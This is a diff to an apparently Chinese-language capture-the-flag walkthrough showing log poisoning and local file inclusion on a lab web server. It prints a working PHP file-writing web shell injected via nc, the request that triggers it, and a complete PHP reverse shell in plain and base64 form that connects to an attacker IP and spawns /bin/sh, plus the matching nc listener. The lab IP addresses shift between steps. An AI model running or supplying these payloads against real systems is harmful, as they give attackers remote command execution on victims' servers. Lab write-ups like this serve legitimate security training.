@@ -52,7 +52,7 @@ cat user.txt
 cc5db5e7b0a26e807765f47a006f6221
 ```
 
-使用file_put_contents函数写入shell
+# 使用file_put_contents函数写入shell
 
 ```c
 nc 192.168.18.238 80 
@@ -60,7 +60,22 @@ GET <?php file_put_contents('/var/www/html/a.php',base64_decode($_GET['a'])); ?>
 ```
 
 访问一下链接：http://192.168.1.226/includes.php?display_page=/var/log/apache2/access.log
-然后确定`<?php phpinfo();?>`base64编码的代码
+然后确定`<?php phpinfo(); ?>`base64编码的代码
 ```css
 http://192.168.18.238/includes.php?display_page=/var/log/apache2/access.log&a=PD9waHAgcGhwaW5mbygpOyA/Pg==
+```
+接下来去包含这个文件，如下说明写入成功http://192.168.18.238/a.php
+这里我们可以换个思路，将phpinfo代码换成php恢复shell代码。
+
+```c
+<?php set_time_limit(0);$ip='192.168.44.128';$port=9002;$chunk_size=1400;$write_a=null;$error_a=null;$shell='uname -a; w; id; /bin/sh -i';chdir("/");umask(0);$sock=fsockopen($ip,$port,$errno,$errstr,30);if(!$sock){exit(1);}$descriptorspec=array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));$process=proc_open($shell,$descriptorspec,$pipes);if(!is_resource($process)){exit(1);}stream_set_blocking($pipes[0],0);stream_set_blocking($pipes[1],0);stream_set_blocking($pipes[2],0);stream_set_blocking($sock,0);while(1){if(feof($sock)){break;}if(feof($pipes[1])){break;}$read_a=array($sock,$pipes[1],$pipes[2]);$num_changed_sockets=stream_select($read_a,$write_a,$error_a,null);if(in_array($sock,$read_a)){$input=fread($sock,$chunk_size);fwrite($pipes[0],$input);}if(in_array($pipes[1],$read_a)){$input=fread($pipes[1],$chunk_size);fwrite($sock,$input);}if(in_array($pipes[2],$read_a)){$input=fread($pipes[2],$chunk_size);fwrite($sock,$input);}}fclose($sock);fclose($pipes[0]);fclose($pipes[1]);fclose($pipes[2]);proc_close($process); ?>
+
+PD9waHAgc2V0X3RpbWVfbGltaXQoMCk7JGlwPScxOTIuMTY4LjQ0LjEyOCc7JHBvcnQ9OTAwMjskY2h1bmtfc2l6ZT0xNDAwOyR3cml0ZV9hPW51bGw7JGVycm9yX2E9bnVsbDskc2hlbGw9J3VuYW1lIC1hOyB3OyBpZDsgL2Jpbi9zaCAtaSc7Y2hkaXIoIi8iKTt1bWFzaygwKTskc29jaz1mc29ja29wZW4oJGlwLCRwb3J0LCRlcnJubywkZXJyc3RyLDMwKTtpZighJHNvY2spe2V4aXQoMSk7fSRkZXNjcmlwdG9yc3BlYz1hcnJheSgwPT5hcnJheSgicGlwZSIsInIiKSwxPT5hcnJheSgicGlwZSIsInciKSwyPT5hcnJheSgicGlwZSIsInciKSk7JHByb2Nlc3M9cHJvY19vcGVuKCRzaGVsbCwkZGVzY3JpcHRvcnNwZWMsJHBpcGVzKTtpZighaXNfcmVzb3VyY2UoJHByb2Nlc3MpKXtleGl0KDEpO31zdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1swXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1sxXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRwaXBlc1syXSwwKTtzdHJlYW1fc2V0X2Jsb2NraW5nKCRzb2NrLDApO3doaWxlKDEpe2lmKGZlb2YoJHNvY2spKXticmVhazt9aWYoZmVvZigkcGlwZXNbMV0pKXticmVhazt9JHJlYWRfYT1hcnJheSgkc29jaywkcGlwZXNbMV0sJHBpcGVzWzJdKTskbnVtX2NoYW5nZWRfc29ja2V0cz1zdHJlYW1fc2VsZWN0KCRyZWFkX2EsJHdyaXRlX2EsJGVycm9yX2EsbnVsbCk7aWYoaW5fYXJyYXkoJHNvY2ssJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkc29jaywkY2h1bmtfc2l6ZSk7ZndyaXRlKCRwaXBlc1swXSwkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMV0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMV0sJGNodW5rX3NpemUpO2Z3cml0ZSgkc29jaywkaW5wdXQpO31pZihpbl9hcnJheSgkcGlwZXNbMl0sJHJlYWRfYSkpeyRpbnB1dD1mcmVhZCgkcGlwZXNbMl0sJGNodW5rX3NpemUpO2Z3cml0ZSgkc29jaywkaW5wdXQpO319ZmNsb3NlKCRzb2NrKTtmY2xvc2UoJHBpcGVzWzBdKTtmY2xvc2UoJHBpcGVzWzFdKTtmY2xvc2UoJHBpcGVzWzJdKTtwcm9jX2Nsb3NlKCRwcm9jZXNzKTsgPz4=
+
+
+
+访问http://192.168.18.238/a.php  反弹shell成功
+┌──(kali㉿kali)-[~]
+└─$ nc -lnvp  9002
+
 ```
